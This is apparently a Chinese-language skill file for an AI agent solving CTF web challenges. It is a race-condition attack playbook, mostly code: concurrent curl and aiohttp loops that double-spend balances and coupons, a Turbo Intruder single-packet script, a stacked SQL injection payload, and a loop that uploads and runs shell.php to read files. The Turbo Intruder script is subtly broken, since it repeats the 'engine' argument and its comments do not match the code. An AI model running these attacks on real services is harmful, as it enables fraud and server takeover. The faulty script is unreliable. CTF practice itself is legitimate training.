---
name: ctf-web-race
description: CTF 条件竞争 攻击 playbook。识别/触发：条件竞争/TOCTOC/TOCTOU/并发请求/改余额/余额翻倍/优惠券重复使用/签到重复领取/PDO emulated prepare/PDO::ATTR_EMULATE_PREPARES/MySQL 多语句并发/Turbo Intruder/并发漏洞/race condition/双花/double spend。碰到"先查后改"两步逻辑、余额/积分/优惠券/签到可重复触发、注册或兑换接口高并发报错、PDO emulated 模式下堆叠注入等指纹时，由二级 ctf-web 路由表调用本 leaf，专项解决"这个并发考点怎么打"。
---

# CTF 条件竞争 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径。

## 识别特征（什么时候调我）
- **TOCTOU 两步逻辑**：业务接口是"先 SELECT 查余额/状态 → 判断 → 再 UPDATE"，中间无事务/无行锁；短时间内发多次同一请求会让多个线程同时通过 `if (balance >= cost)` 的判断。
- **签到/优惠券/邀请码可重复**：签到接口无幂等键、优惠券可被同一账号多次核销、邀请奖励可重复领取；响应里次数或余额线性增长。
- **PDO emulated prepare 指纹**：源码出现 `PDO::ATTR_EMULATE_PREPARES => true` 或默认 emulated 模式 + 拼接 SQL，堆叠多语句在并发下可触发二次注入或绕过。
- **注册/兑换竞态**：用同一 token/邮箱并发注册，重复写入或绕过唯一约束；兑换码接口高并发下放行超额兑换。
- **文件操作竞态**：上传后校验再删除（`move_uploaded_file` 后 `unlink`）、临时文件短暂存在可被竞争包含/读取。
- **Burp Repeater 串行请求跑不出问题**，但 Turbo Intruder / 多线程一打就出 → 典型 race。

## 核心攻击手法

### 1. 最小验证：确认是否真存在 race（先证明再放大）
用同一 cookie/token，对一个"只应成功一次"的接口连续打 N 次，看响应/余额是否异常增长：

```bash
# 单接口并发 20 次，看成功响应数（应只有 1 个却出现多个）
for i in $(seq 1 20); do
  curl -s -b "session=xxxxxx" -o /tmp/r_$i.html \
    "http://target/transfer?to=alice&amount=100" &
done; wait
grep -l "success" /tmp/r_*.html | wc -l   # >1 即命中 race
```

### 2. Turbo Intruder（首选，CTF 并发题最顺手的工具）
Burp → 右键 Send to Turbo Intruder，用 `single-packet` 让多个请求落在同一 TCP/TLS 帧内，把时间差压到纳秒级（绕过大部分 select-then-update 窗口）：

```python
# Turbo Intruder 脚本（Engine.BURP2 + single packet）
def queueRequests(target, wordlists):
    engine = RequestEngine(target=target,
                           engine=Engine.BURP2,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           requestsPerConnection=20,
                           pipeline=False)
    # 关键：最后一个参数 True = single packet attack
    for i in range(25):
        engine.queue(target.req, i, gatechunk=True)
    engine.openGate()   # 同一帧一起放出

def handleResponse(req, interesting):
    # 收集响应，找多出来的成功
    table.add(req)
```

> Turbo Intruder 的 `gate` / `engine=Engine.BURP2` + `requestsPerConnection` 是把 25 个请求塞进一个网络包的核心；普通 Repeater 并发打不出这种精度。

### 3. 改余额 / 双花 / 兑换码超额（最常见题型）
- 思路：余额 100、扣 100 的接口，并发 20 次 → 多个线程都读到 balance=100 通过校验，余额变成负数或被白嫖。
- payload：把上面 Turbo Intruder 脚本指向 `/buy` / `/transfer` / `/redeem` 即可。
- 兑换码类：先并发兑换把库存打成负数，再触发"库存达标发 flag"的逻辑。

### 4. 签到/邀请重复领取（幂等缺失）
同一 session 并发打 `/checkin`，积分 ×N，再拿积分兑换 flag：

```bash
# 用 xargs 控并发，避免打挂轻量靶机（线程保持个位数）
seq 1 10 | xargs -P 5 -I{} curl -s -b "session=xxxx" "http://target/checkin"
```

### 5. PDO emulated prepare → 堆叠注入（竞态的近亲考点）
`PDO::ATTR_EMULATE_PREPARES=true` 时 PDO 在客户端模拟 prepare，多条语句用 `;` 可堆叠（非 race，但常与并发题同源指纹出现）：

```text
login=admin';SELECT flag FROM flags-- -
# 或利用二次查询：先注入一条，再触发读取
```

### 6. 文件竞态（上传-校验-删除窗口）
临时文件名可预测（如 `cache_<id>.php`）→ 一个线程不断写马，一个线程不断访问/包含，抢在 `unlink` 前命中：

```bash
# 写入循环 + 访问循环分两终端
while true; do curl -s "http://target/upload" -F "f=@shell.php"; done
while true; do curl -s "http://target/tmp/cache_1.php?c=cat%20/flag"; done
```

## CTF 实战结晶
（待积累，下次遇到本题型回填此处：题名 + 确切 trick + payload + 链路）

## 工具命令

```bash
# 快速并发压测（轻量靶机线程别开高，个位数即可）
seq 1 20 | xargs -P 8 -I{} curl -s -b "session=xxx" "http://target/redeem?code=ABC"

# Python aiohttp 高精度并发（可控延时，比 curl 更稳）
python3 - <<'PY'
import asyncio, aiohttp
async def hit(s, i):
    async with s.get("http://target/redeem", params={"code":"ABC"}, cookies={"session":"xxx"}) as r:
        return await r.text()
async def main():
    async with aiohttp.ClientSession() as s:
        res = await asyncio.gather(*[hit(s,i) for i in range(30)])
        print("success:", sum("ok" in x for x in res))
asyncio.run(main())
PY

# Turbo Intruder：Burp 内右键 → Send to Turbo Intruder → 选 single-packet 模板
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/race-condition/SKILL.md
- PortSwigger Web Security Academy: Race conditions（single-packet attack 原理）

## 关联 leaf
- `ctf-web-sqli`：PDO emulated prepare 堆叠注入常与并发题同源指纹出现。
- `ctf-web-auth-saml`：邀请码/兑换码竞态多在认证与权限链路上。
- `ctf-web-upload`：文件竞态（上传-校验-删除窗口）需配合上传与包含利用。
- `ctf-web-ssrf` / `ctf-web-deser`：部分题 race 触发缓存或 session 反序列化后接这些 leaf。
